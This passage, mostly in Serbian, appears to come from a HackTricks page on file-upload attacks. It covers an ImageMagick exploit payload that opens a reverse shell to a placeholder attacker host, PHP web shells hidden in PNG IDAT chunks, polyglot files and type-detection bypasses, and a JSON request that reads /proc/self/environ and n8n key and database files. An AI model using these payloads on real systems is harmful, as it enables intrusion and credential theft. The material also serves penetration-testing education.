Otpremite ovaj sadržaj sa ekstenzijom slike da biste iskoristili ranjivost **(ImageMagick , 7.0.1-1)** (iz [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Umetanje PHP shell-a u PNG

Umetanje PHP shell-a u IDAT chunk PNG fajla može efikasno zaobići određene operacije obrade slika. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD su posebno relevantne u ovom kontekstu, pošto se obično koriste za promenu veličine i resampling slika, respektivno. Sposobnost ugrađenog PHP shell-a da ostane nepromenjen od strane ovih operacija predstavlja značajnu prednost za neke slučajeve upotrebe.

A detailed exploration of this technique, including its methodology and potential applications, is provided in the following article: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). This resource offers a comprehensive understanding of the process and its implications.

Više informacija u: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot fajlovi

Polyglot fajlovi služe kao jedinstveno sredstvo u cyber sigurnosti, ponašajući se kao kameleon koji može validno postojati u više formata istovremeno. Intrigantan primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniše i kao GIF i kao RAR arhiva. Takve datoteke nisu ograničene na ovo uparivanje; kombinacije poput GIF i JS ili PPT i JS takođe su moguće.

Osnovna korisnost polyglot fajlova leži u njihovoj sposobnosti da zaobiđu bezbednosne mere koje filtriraju fajlove po tipu. Uobičajena praksa u raznim aplikacijama je da se dozvoljavaju samo određeni tipovi fajlova za upload — kao što su JPEG, GIF, ili DOC — kako bi se smanjio rizik od potencijalno opasnih formata (npr. JS, PHP, ili Phar). Međutim, polyglot, tako što ispunjava strukturalne kriterijume više formata, može prikriveno zaobići ova ograničenja.

Uprkos svojoj prilagodljivosti, polygloti imaju ograničenja. Na primer, dok polyglot može istovremeno predstavljati PHAR fajl (PHp ARchive) i JPEG, uspeh njegovog uploada može zavisiti od politike platforme u vezi sa ekstenzijama fajlova. Ako sistem strogo zahteva dozvoljene ekstenzije, sama strukturalna dvostrukost polyglota možda neće biti dovoljna da garantuje njegov upload.

Više informacija u: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Otpremanje validnih JSON-ova kao da su PDF

Kako izbeći detekciju tipa fajla otpremanjem validnog JSON fajla čak i ako nije dozvoljeno, falsifikujući ga kao PDF (tehnike iz **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` biblioteka**: Dokle god su `%PDF` magic bajtovi u prvih 1024 bajta, smatra se validnim (vidi primer u postu)
- **`pdflib` biblioteka**: Ubacite lažni PDF format unutar polja JSON-a tako da biblioteka misli da je PDF (vidi primer u postu)
- **`file` binary**: Može pročitati do 1048576 bajtova iz fajla. Jednostavno napravite JSON veći od toga tako da ne može da parsira sadržaj kao JSON, a zatim unutar JSON-a stavite početni deo pravog PDF-a i on će pomisliti da je PDF

### Content-Type konfuzija do proizvoljnog čitanja fajlova

Neki upload handler-i se **pouzdaju u parsirano telo zahteva** (npr., `context.getBodyData().files`) i kasnije **kopiraju fajl iz `file.filepath`** bez prethodnog insistiranja na `Content-Type: multipart/form-data`. Ako server prihvata `application/json`, možete dostaviti lažni `files` objekat koji upućuje `filepath` na **bilo koji lokalni put**, pretvarajući tok otpremanja u primitivu za proizvoljno čitanje fajlova.

Primer POST zahteva za form workflow koji vraća otpremljeni binarni sadržaj u HTTP odgovoru:
```http
POST /form/vulnerable-form HTTP/1.1
Host: target
Content-Type: application/json

{
"files": {
"document": {
"filepath": "/proc/self/environ",
"mimetype": "image/png",
"originalFilename": "x.png"
}
}
}
```
Backend kopira `file.filepath`, pa odgovor vraća sadržaj te putanje. Uobičajeni lanac: pročitaj `/proc/self/environ` da saznaš `$HOME`, zatim `$HOME/.n8n/config` za ključeve i `$HOME/.n8n/database.sqlite` za identifikatore korisnika.

## Izvori

- [n8n form upload Content-Type confusion → arbitrary file read PoC](https://github.com/Chocapikk/CVE-2026-21858)
- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
